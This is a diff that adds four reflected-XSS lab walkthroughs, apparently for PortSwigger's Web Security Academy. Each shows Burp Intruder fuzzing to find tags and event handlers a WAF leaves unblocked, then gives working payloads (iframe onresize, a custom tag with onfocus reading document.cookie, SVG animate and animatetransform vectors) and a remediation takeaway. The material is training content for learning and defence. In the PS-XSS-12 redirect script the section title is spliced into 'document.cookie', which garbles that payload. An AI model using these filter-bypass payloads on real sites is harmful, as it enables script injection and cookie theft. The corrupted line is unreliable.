@@ -380,3 +380,147 @@ Host: target.web-security-academy.net
 6. Render the page in the browser. The HTML parser encounters `</script>` inside the string literal, immediately terminates the first script element, and then parses and executes the subsequent `<script>alert(1)</script>` block.
 
 > **Key Takeaway:** HTML parsing takes precedence over JavaScript parsing for inline script blocks. Escaping JavaScript-specific characters (like quotes and backslashes) is ineffective if an attacker can introduce HTML tag delimiters. To remediate this, applications must HTML-encode angle brackets (`<` and `>`) when reflecting input inside inline script tags, or ideally load dynamic values via dedicated data attributes or JSON APIs.
+
+---
+
+### [PS-XSS-11] Reflected XSS into HTML context with most tags and attributes blocked
+
+**Scenario:** The application attempts to prevent XSS by utilizing a Web Application Firewall (WAF) or filter that blacklists standard HTML tags and attributes. However, by systematically fuzzing the filter, an attacker can identify unblocked HTML tags (`<body>`) and event handlers (`onresize`). Because the victim's browser must be forced to resize to fire the event automatically, the exploit is delivered via an `<iframe>` hosted on the exploit server.
+
+**Solution:**
+
+1. Intercept a search request on the target home page using Burp Suite and send it to **Burp Intruder**.
+2. Replace the search parameter value with a tag payload position:
+
+```http
+GET /?search=<%24tag%24> HTTP/1.1
+Host: target.web-security-academy.net
+
+```
+
+3. Load a list of standard HTML tags (from the PortSwigger XSS cheat sheet) into Intruder and start the attack. Observe that the server returns `200 OK` for `<body>` while blocking most other tags with a `400` or `403` status.
+4. Update the Intruder position to fuzz event handlers on the `<body>` tag:
+
+```http
+GET /?search=%3Cbody+%24event%24%3D1%3E HTTP/1.1
+
+```
+
+5. Load a list of event handlers into Intruder and run the attack. Note that `onresize` returns `200 OK`.
+6. Access the lab's **Exploit Server** and paste the following payload into the **Body** section, which loads the target with the payload and resizes the frame immediately:
+
+```html
+<iframe src="https://target.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" onload="this.style.width='100px'"></iframe>
+
+```
+
+7. Click **Store** and **Deliver exploit to victim**. When the victim visits the page, the `<iframe>` loads the search response containing `<body onresize=print()>` and its `onload` attribute alters the frame width, triggering `onresize` and calling `print()`.
+
+> **Key Takeaway:** Blacklisting tags and event handlers is fundamentally insecure because web standards support hundreds of tag and attribute combinations. Attackers can easily bypass WAF filters by automated fuzzing. Applications must enforce strict context-aware output encoding or use strong Content Security Policies (CSP) rather than relying on input blacklists.
+
+---
+
+### [PS-XSS-12] Reflected XSS into HTML context with all tags blocked except custom ones
+
+**Scenario:** The application uses a WAF or input filter that blocks all standard, known HTML tags (e.g., `script`, `img`, `body`, `svg`). However, modern browser specs allow custom HTML elements (such as `<xss>`) which are not present in standard WAF blocklists. By defining a custom tag with an `id` attribute, `tabindex`, and an `onfocus` event handler, an attacker can deliver an exploit that automatically focuses the element via URL hash navigation (`#id`) to trigger JavaScript execution.
+
+**Solution:**
+
+1. Intercept a search request in Burp Suite and send it to **Burp Intruder**.
+2. Fuzz standard tags vs. arbitrary strings in the search parameter. Observe that all standard HTML tags return a `400 Bad Request` or `403 Forbidden`, while custom tag names like `<xss>` return `200 OK`.
+3. Construct a custom tag payload containing an `onfocus` handler, an `id` attribute, and `tabindex="1"` to make the custom tag focusable:
+
+```html
+<xss id=x onfocus=alert(document.cookie) tabindex=1>
+
+```
+
+4. Access the lab's **Exploit Server**.
+5. In the **Body** text area, write a script that redirects the victim's browser to the target site with the custom tag payload in the search parameter, appending the `#x` hash to force immediate focus on element `id="x"`:
+
+```html
+<script>
+location = 'https://target.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cooReflected XSS into HTML context with all tags blocked except custom oneskie%29+tabindex%3D1%3E#x';
+</script>
+
+```
+
+6. Click **Store** and **Deliver exploit to victim**.
+7. When the victim visits the exploit page, the script forces navigation to the target URL. The browser parses the custom `<xss>` element, reads the `#x` anchor, focuses the element automatically, and triggers the `onfocus` handler to execute `alert(document.cookie)`.
+
+> **Key Takeaway:** Relying on tag blocklists for XSS protection is ineffective because HTML parsers allow unrecognised or custom tags to exist in the DOM. Custom elements inherit standard HTML event attributes (`onfocus`) and accessibility properties (`tabindex`), allowing attackers to create fully functional execution vectors outside traditional tag filters.
+
+---
+
+### [PS-XSS-13] Reflected XSS with event handlers and href attributes blocked
+
+**Scenario:** The application employs a Web Application Firewall (WAF) that blocks all standard JavaScript event handlers (`onload`, `onerror`, `onclick`, etc.) and prevents direct `href` attributes on elements. However, the WAF allows SVG container elements, anchor tags (`<a>`), and SVG animation tags (`<animate>`). An attacker can bypass the attribute filter by leveraging the `<animate>` tag to dynamically write a `javascript:` payload into the parent `<a>` element's `href` attribute at runtime.
+
+**Solution:**
+
+1. Submit a search query on the target home page and observe how the input reflects in the HTML response.
+2. Intercept the request in Burp Suite and verify through Burp Intruder or manual testing that standard event handlers (e.g., `onload`) and direct `href` attributes are blocked with a `400` or `403` status.
+3. Observe that `<svg>`, `<a>`, and `<animate>` tags are permitted.
+4. Construct an SVG payload that uses the `<animate>` element to set the `attributeName` property to `href` and populate its value with the `javascript:` pseudo-protocol:
+
+```html
+<svg><a><animate attributeName="href" values="javascript:alert(1)" /><text x="20" y="20">Click me</text></a></svg>
+
+```
+
+5. Submit the URL-encoded payload via the search parameter:
+
+```http
+GET /?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3D%22href%22+values%3D%22javascript%3Aalert%281%29%22+%2F%3E%3Ctext+x%3D%2220%22+y%3D%2220%22%3EClick+me%3C%2Ftext%3E%3C%2Fa%3E%3C%2Fsvg%3E HTTP/1.1
+Host: target.web-security-academy.net
+
+```
+
+6. Render the page in the browser and click the "Click me" text. The `<animate>` tag dynamically injects `href="javascript:alert(1)"` into the anchor tag, executing `alert(1)` upon interaction.
+
+> **Key Takeaway:** Restricting direct attribute names (like `href`) or event handlers is ineffective if SVG elements are allowed. SVG animation tags (`<animate>`, `<set>`) can dynamically mutate DOM attributes at runtime, bypassing static attribute filters. To mitigate XSS, applications must perform strict output encoding or implement a robust Content Security Policy (CSP) instead of relying on attribute blocklists.
+
+---
+
+### [PS-XSS-14] Reflected XSS with some SVG markup allowed
+
+**Scenario:** The application reflects user input inside an HTML response and relies on a Web Application Firewall (WAF) to filter standard XSS tags and event handlers. However, the blocklist fails to cover the entire SVG specification, leaving specific SVG elements (`<svg>`, `<animatetransform>`, `<image>`, `<title>`) and SVG-specific animation event handlers (`onbegin`) permitted. An attacker can nest an `<animatetransform>` element inside an `<svg>` wrapper to execute arbitrary JavaScript automatically when the animation starts.
+
+**Solution:**
+
+1. Submit a search query on the target home page and intercept the HTTP request in Burp Suite.
+2. Send the request to **Burp Intruder** and highlight the search parameter value as a payload position:
+
+```http
+GET /?search=<%24tag%24> HTTP/1.1
+Host: target.web-security-academy.net
+
+```
+
+3. Load a list of HTML/SVG tags into Intruder and run the attack. Observe that `<svg>`, `<animatetransform>`, `<image>`, and `<title>` return a `200 OK` response while most other tags return `400` or `403`.
+4. Configure Intruder to fuzz event handlers on the permitted `<animatetransform>` tag:
+
+```http
+GET /?search=%3Csvg%3E%3Canimatetransform+%24event%24%3D1%3E HTTP/1.1
+
+```
+
+5. Run the attack with a list of event handlers. Note that `onbegin` returns `200 OK`.
+6. Construct the final XSS payload:
+
+```html
+<svg><animatetransform onbegin=alert(1)></svg>
+
+```
+
+7. Submit the URL-encoded payload in the search query parameter:
+
+```http
+GET /?search=%3Csvg%3E%3Canimatetransform+onbegin%3Dalert%281%29%3E HTTP/1.1
+Host: target.web-security-academy.net
+
+```
+
+8. View the page in the browser. The SVG engine initializes the `<animatetransform>` element and fires the `onbegin` event immediately, executing `alert(1)`.
+
+> **Key Takeaway:** The SVG vector space contains numerous niche elements and non-standard event handlers (such as `onbegin`, `onend`, and `onrepeat`) that easily bypass WAF blocklists focused solely on traditional HTML elements (`<script>`, `<img>`, `onload`). Complete protection against reflected XSS requires robust context-aware output encoding or a strict Content Security Policy (CSP) rather than incomplete tag blacklists.
